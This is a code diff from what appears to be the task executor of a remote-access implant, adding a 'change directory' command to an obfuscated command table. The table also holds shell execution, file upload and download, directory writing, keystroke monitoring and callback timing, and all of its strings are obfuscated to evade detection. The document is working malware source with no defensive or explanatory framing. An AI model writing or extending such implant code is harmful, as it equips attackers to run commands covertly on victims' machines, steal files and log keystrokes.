@@ -393,8 +393,8 @@ void *task_executor(void *ptr){
   #endif
   cJSON *data = tsk->data;
   buffer *result_buff = create_buffer(0);
-  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay"};
-  for (int i = 0; i < 7; i++)
+  char cmd_strs[][30] = {"[OBFS_ENC]system", "[OBFS_ENC]download", "[OBFS_ENC]upload", "[OBFS_ENC]writedir", "[OBFS_ENC]keymon", "[OBFS_ENC]abort", "[OBFS_ENC]delay", "[OBFS_ENC]cd"};
+  for (int i = 0; i < 8; i++)
     obfs_decode(cmd_strs[i]);
   if (!strcmp(tsk->type, cmd_strs[0])){ // Run a shell command.
     char strs[][20] = {"[OBFS_ENC]cmd", "[OBFS_ENC]%s 2>&1"};
@@ -478,6 +478,12 @@ void *task_executor(void *ptr){
     char msg[] = "[OBFS_ENC]Callback delay updated!";
     striker->delay = cJSON_GetNumberValue(cJSON_GetObjectItemCaseSensitive(data, cmd_strs[6]));
     buffer_strcpy(result_buff, obfs_decode(msg));
+  }else if (!strcmp(tsk->type, cmd_strs[7])){
+    char strs[][50] = {"[OBFS_ENC]Changed working directory!", "[OBFS_ENC]Error changing working directory!", "[OBFS_ENC]dir"};
+    if (chdir(cJSON_GetStringValue(cJSON_GetObjectItemCaseSensitive(data, obfs_decode(strs[2])))))
+      buffer_strcpy(result_buff, obfs_decode(strs[1]));
+    else
+      buffer_strcpy(result_buff, obfs_decode(strs[0]));
   }else{
     char msg[] = "[OBFS_ENC]Not implemented!";
     buffer_strcpy(result_buff, obfs_decode(msg));
